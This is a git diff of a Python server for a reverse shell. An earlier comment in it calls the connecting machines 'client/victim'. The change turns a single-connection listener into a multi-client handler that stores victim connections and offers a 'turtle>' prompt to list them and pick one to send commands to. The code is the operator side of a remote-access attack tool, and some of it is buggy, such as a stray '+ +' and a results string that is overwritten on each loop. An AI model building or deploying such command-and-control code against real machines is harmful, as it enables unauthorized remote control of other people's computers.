@@ -1,5 +1,14 @@
 import socket
 import sys
+import threading
+import time
+from queue import Queue
+
+NUMBER_OF_THREADS = 2
+JOB_NUMBER = [1, 2]
+queue = Queue()
+all_connections = []
+all_address = []
 
 #Create a Socket (connect two computers)
 def create_socket():
@@ -28,31 +37,55 @@ def bind_socket():
         print("Socket Binding error: " + "\n" + "Retrying...")
         bind_socket()
 
-#Establish connection with a client (socket must be listening)
-def socket_accept():
-    conn, address = s.accept()
-    print("Connection has been established! -" + " IP " + address[0] + " - Port" + str(address[1]))
-    send_command(conn)
-    conn.close
+#Handling connections from multiple clients and saving to a list
+#Closing previous connections when server.py file is restarted
 
-#Send commands to client/victim or a friend
-def send_command(conn):
+def accepting_connections():
+    for c in all_connections:
+        c.close()
+    
+    del all_connections[:]
+    del all_address[:]
+
     while True:
-        cmd = input()
-        if cmd == 'quit':
-            conn.close()
-            s.close()
-            sys.exit()
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024), "utf-8")
-            print(client_response, end="")
+        try:
+            conn, address = s.accept()
+            s.setblocking(1) #prevents timeout
 
-def main():
-    create_socket()
-    bind_socket()
-    socket_accept()
+            all_connections.append(conn)
+            all_address.append(address)
 
+            print("Connection has been established :" + address[0])
+        
+        except:
+            print("Error accepting connections")
 
+def start_turtle():
+    cmd = input('turtle> ')
 
-main()
+    if cmd == 'list':
+        list_connections()
+    
+    elif 'select' in cmd:
+        conn = get_target(cmd)
+        if conn is not None:
+            send_target_commands(conn)
+    
+    else:
+        print("Command not recognized")
+
+def list_connections():
+    results = ''
+
+    for i, conn in enumerate(all_connections):
+        try:
+            conn.send(str.encode(' '))
+            conn.recv(201480)
+        except:
+            del all_connections[i]
+            del all_address[i]
+            continue
+
+        results = str(i) + "  " + str(all_address[i][0]) + + "  " + str(all_address[i][1]) + "\n"
+        
+    print("----- Clients -----" + "\n" + results)
